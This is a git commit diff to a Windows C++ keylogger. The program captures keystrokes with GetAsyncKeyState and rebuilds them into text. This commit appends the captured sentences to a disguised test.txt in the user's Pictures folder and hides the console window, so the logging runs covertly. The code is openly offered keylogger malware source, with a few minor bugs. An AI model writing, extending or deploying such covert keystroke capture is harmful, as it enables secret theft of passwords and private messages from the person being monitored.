9bec0bbd1c6b7aace682ea47a9cca4187faff25d
lshen365 <lshen1905@gmail.com>
2019-06-14 01:46:01 -0600

    Puts it inside a text file and moves it to picture folder. Also, inserts it into text fiel rather than into command prompt. Command prompt is hidden now as well.

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -3,7 +3,17 @@
 #include <Windows.h>
 #include <iostream>
 #include <cstdlib>
+#include <tchar.h>
+#include <fstream>
+#include <string>
+#include <cstring>
+#include <Shlwapi.h>
+#include <WinBase.h>
+
+#define INFO_BUFFER_SIZE 32767
 using namespace std;
+
+
 
 
 
@@ -23,11 +33,89 @@ bool isSpecial(DWORD value) {
 		return true;
 	return false;
 }
+
+
+string getCompName() {
+
+	string name = "";
+	DWORD hold = INFO_BUFFER_SIZE;
+	char* temp = new char[MAX_COMPUTERNAME_LENGTH+1];
+	GetUserName(temp, &hold);
+	name = temp;
+	delete [] temp;
+	return name;
+
+
+}
+string getCurrDir() {
+	string dir = "";
+	char* temp = new char[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, temp);
+	dir = temp;
+	delete [] temp;
+	return dir;
+}
+
+char* stringToChar(string text) {
+	char* convert = new char[text.length()+1];
+	memcpy(convert, text.c_str(), text.length() + 1);
+	return convert;
+	delete[] convert;
+}
+
+void moveFile() {
+	char* dest = stringToChar("C:\\Users\\" + getCompName() + "\\Pictures\\test.txt");
+	int success = MoveFileA("C:test.txt", dest);
+	if (success == 0) {
+		cout << "Error in moveFile code- " << GetLastError()<< endl;
+	}
+}
+void createFile() {
+	HANDLE file = CreateFile("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
+	if (file == INVALID_HANDLE_VALUE) {
+		cout << "Error in creating file" << endl;
+	}
+	CloseHandle(file);
+
+	//cout << getCurrDir() << " " << endl;
+}
+void hideFile() {
+
+	DWORD temp;
+	HANDLE myFile;
+	
+	WriteFile(myFile, "Hello", 1, &temp, NULL);
+}
+
+void insertIntoText(string text) {
+	char *path = stringToChar("C:\\Users\\" + getCompName() + "\\Pictures\\test.txt");
+	ofstream myFile;
+	myFile.open(path, ios::app);
+	if (myFile.is_open()) {
+		myFile << text<<endl;
+	}
+	else {
+		cout << "Failed to enter to file" << endl;
+	}
+	myFile.close();
+}
+bool checkFile() {
+	string path = "C:\\Users\\" + getCompName() + "\\Pictures\\test.txt";
+	char* cstr = new char[path.length()+1];
+	path.copy(cstr, path.size() );
+	cstr[path.size()] = '\0';
+	if (GetFileAttributesA(cstr) == 0xffffffff) {
+		return false;
+	}
+	delete [] cstr;
+	return true;
+}  
+
 void findLetterTyped() {
 
 	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
 	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
-	char special[11] = { ';','=',',','-','.','/','`','[','\\',']','\''};
+	char special[11] = { ';','=',',','-','.','/','`','[','\\',']','\'' };
 
 	DWORD word = 0x30;
 	for (int i = 0; i < 52; i++) {
@@ -74,24 +162,25 @@ void findLetterTyped() {
 				else {
 					currentSentence += toupper(alphabet[abs(42 - i - 26 + 1)]);
 				}
-				
-				
-				
-			}else if (isNum(word)) { //Deals with Uppercase letters
+
+
+
+			}
+			else if (isNum(word)) { //Deals with Uppercase letters
 				currentSentence += numbers[i];
-				
+
 			}
 			else {
-				currentSentence += alphabet[abs(42-i-26+1)];
+				currentSentence += alphabet[abs(42 - i - 26 + 1)];
 			}
-			
+
 		}
 
 		word++;
 
 	}
 
-	DWORD specialKey = 0xBA; 
+	DWORD specialKey = 0xBA;
 	for (int i = 0; i < 37; i++) {
 		if (GetAsyncKeyState(specialKey) & 1) {
 			if (GetKeyState(VK_SHIFT) & 0x8000) {
@@ -139,13 +228,13 @@ void findLetterTyped() {
 			else {
 				if (i <= 7) {
 					currentSentence += special[i];
-				
+
 				}
 				else if (i >= 31) {
 					currentSentence += special[abs(37 - i - 11)];
 				}
 
-				
+
 			}
 		}
 		specialKey++;
@@ -157,21 +246,34 @@ void findLetterTyped() {
 	if ((GetAsyncKeyState(VK_SPACE) & 1)) {
 		currentSentence += " ";
 	}
-	if ((GetAsyncKeyState(VK_RETURN) & 1)|| (GetAsyncKeyState(VK_TAB) & 1)) {
-		cout << currentSentence << endl;
+	if ((GetAsyncKeyState(VK_RETURN) & 1) || (GetAsyncKeyState(VK_TAB) & 1)) {
+		insertIntoText(currentSentence);
 		currentSentence = "";
 		return;
 	}
 }
 
 
+void hideConsole() {
+	ShowWindow(GetConsoleWindow(), 0);
+}
 int main()
 {
+
+	if (!checkFile()) {
+		cout << "File not found" << endl;
+		createFile();
+		moveFile();
+	}
+
+	hideConsole();
 	while (1) {
 		Sleep(1);
 		findLetterTyped();
 	}
 }
+
+
 
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
 // Debug program: F5 or Debug > Start Debugging menu
